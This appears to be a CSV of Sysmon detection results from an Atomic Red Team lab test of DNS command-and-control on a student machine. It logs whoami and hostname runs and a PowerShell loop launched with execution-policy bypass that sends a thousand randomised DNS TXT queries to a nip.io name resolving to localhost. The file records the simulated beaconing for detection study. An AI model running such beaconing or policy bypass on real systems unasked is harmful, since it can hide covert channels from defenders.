"Timestamp","RuleTitle","Level","Computer","Channel","EventID","MitreTactics","MitreTags","OtherTags","RecordID","Details","ExtraFieldInfo","RuleFile","RuleID","EvtxFile"
"2025-12-22 13:57:54.688 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",165347,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_cntuiola.vgz.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","CreationUtcTime: 2025-12-22 12:57:54.670 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:57:54.672","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:57:47.450 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",165343,"Cmdline: C:\WINDOWS\system32\svchost.exe -k GPSvcGroup ¦ Proc: C:\Windows\System32\svchost.exe ¦ User: NT AUTHORITY\SYSTEM ¦ ParentCmdline: C:\WINDOWS\system32\services.exe ¦ LID: 0x3e7 ¦ LGUID: E9F06A57-0DF5-6949-E703-000000000000 ¦ PID: 10672 ¦ PGUID: E9F06A57-404B-6949-5005-000000002100 ¦ ParentPID: 780 ¦ ParentPGUID: E9F06A57-0DF5-6949-0B00-000000002100 ¦ Description: Host Process for Windows Services ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=0CD128F416A04C06D50EC56392C25D9F,SHA256=324451797AC909A4DD40C7A2F7347EF91F6B7C786941AD5035F609C0FC15EDAA,IMPHASH=DE43BD45CC98C143357416C7519ECCFD","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1150 (WinBuild.160101.0800) ¦ IntegrityLevel: System ¦ OriginalFileName: svchost.exe ¦ ParentImage: C:\Windows\System32\services.exe ¦ RuleName: - ¦ TerminalSessionId: 0 ¦ UtcTime: 2025-12-22 12:57:47.440","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:57:54.233 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",165344,"Cmdline: ""C:\WINDOWS\system32\HOSTNAME.EXE"" ¦ Proc: C:\Windows\System32\HOSTNAME.EXE ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x18dcf ¦ LGUID: E9F06A57-0DF8-6949-CF8D-010000000000 ¦ PID: 4272 ¦ PGUID: E9F06A57-4052-6949-5105-000000002100 ¦ ParentPID: 416 ¦ ParentPGUID: E9F06A57-37B7-6949-AD04-000000002100 ¦ Description: Hostname APP ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=0411E7CFE0D452AFE541C1EA45033168,SHA256=8FF283FB7A282A9B2B30235016669DFE795665BCBB254FD17AC31FA9308D89D9,IMPHASH=8CB84C534505B1E47EF25FA2CD9A16BB","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2161 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: hostname.exe ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-22 12:57:54.229","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:57:54.270 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",165345,"Cmdline: ""C:\WINDOWS\system32\whoami.exe"" ¦ Proc: C:\Windows\System32\whoami.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x18dcf ¦ LGUID: E9F06A57-0DF8-6949-CF8D-010000000000 ¦ PID: 4612 ¦ PGUID: E9F06A57-4052-6949-5205-000000002100 ¦ ParentPID: 416 ¦ ParentPGUID: E9F06A57-37B7-6949-AD04-000000002100 ¦ Description: whoami - displays logged on user information ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=956692DADC5B2CEB46E9219F7A5BEFFA,SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3,IMPHASH=E4464BCD92DF7AC69CCD074CB9C0EFED","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: whoami.exe ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-22 12:57:54.262","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:57:54.549 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",165346,"Cmdline: ""powershell.exe"" & {for($i=0; $i -le 1000; $i++) { Resolve-DnsName -type \""""TXT\"""" \""""atomicredteam-$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.nip.io\"""" -QuickTimeout}} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x18dcf ¦ LGUID: E9F06A57-0DF8-6949-CF8D-010000000000 ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100 ¦ ParentPID: 416 ¦ ParentPGUID: E9F06A57-37B7-6949-AD04-000000002100 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-22 12:57:54.528","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:57:57.690 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165348,"Query: atomicredteam-182558.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:57:56.739","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:57:57.690 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165349,"Query: atomicredteam-15090.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:57:56.786","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:57:57.690 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165350,"Query: atomicredteam-439430.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:57:56.831","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:57:57.690 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165351,"Query: atomicredteam-386192.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:57:56.873","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:57:57.690 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165352,"Query: atomicredteam-159013.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:57:56.913","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:57:57.691 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165353,"Query: atomicredteam-690905.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:57:57.231","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:57:57.691 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165354,"Query: atomicredteam-89750.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:57:57.275","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:57:57.691 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165355,"Query: atomicredteam-80711.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:57:57.318","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:57:57.691 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165356,"Query: atomicredteam-29561.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:57:57.639","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:57:57.691 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165357,"Query: atomicredteam-25672.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:57:57.683","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:57:58.699 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165358,"Query: atomicredteam-167179.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:57:57.729","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:57:58.699 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165359,"Query: atomicredteam-869456.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:57:57.774","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:57:58.699 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165360,"Query: atomicredteam-991574.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:57:57.818","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:57:58.699 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165361,"Query: atomicredteam-680656.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:57:57.862","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:57:58.699 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165362,"Query: atomicredteam-207674.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:57:57.907","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:57:58.699 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165363,"Query: atomicredteam-557880.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:57:58.077","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:57:58.700 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165364,"Query: atomicredteam-601091.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:57:58.120","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:57:58.700 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165365,"Query: atomicredteam-791443.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:57:58.438","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:57:58.700 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165366,"Query: atomicredteam-62686.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:57:58.482","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:57:59.701 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165367,"Query: atomicredteam-625989.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:57:58.526","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:57:59.701 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165368,"Query: atomicredteam-380419.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:57:58.569","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:57:59.701 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165369,"Query: atomicredteam-437562.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:57:58.614","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:57:59.701 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165370,"Query: atomicredteam-14680.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:57:58.657","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:57:59.701 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165371,"Query: atomicredteam-839431.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:57:58.701","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:57:59.701 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165372,"Query: atomicredteam-115790.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:57:58.745","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:57:59.701 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165373,"Query: atomicredteam-125037.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:57:58.790","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:57:59.701 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165374,"Query: atomicredteam-97962.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:57:58.833","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:57:59.701 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165375,"Query: atomicredteam-361702.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:57:58.878","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:57:59.701 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165376,"Query: atomicredteam-186778.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:57:59.197","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:57:59.701 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165377,"Query: atomicredteam-524739.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:57:59.242","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:57:59.701 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165378,"Query: atomicredteam-390295.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:57:59.285","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:57:59.702 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165379,"Query: atomicredteam-191472.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:57:59.327","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:57:59.702 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165380,"Query: atomicredteam-623929.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:57:59.370","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:57:59.702 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165381,"Query: atomicredteam-401678.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:57:59.415","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:57:59.702 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165382,"Query: atomicredteam-432240.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:57:59.457","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:57:59.702 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165383,"Query: atomicredteam-883063.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:57:59.628","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:00.709 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165384,"Query: atomicredteam-932913.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:57:59.948","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
